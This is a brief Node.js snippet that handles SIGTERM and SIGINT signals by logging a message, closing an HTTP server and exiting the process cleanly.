process.on('SIGTERM', () => {
  console.log('🛑 Shutting down gracefully...');
  server.close(() => {
    console.log('✅ Server closed');
    process.exit(0);
  });
});

process.on('SIGINT', () => {
  console.log('🛑 Shutting down gracefully...');
  server.close(() => {
    console.log('✅ Server closed');
    process.exit(0);
  });
});
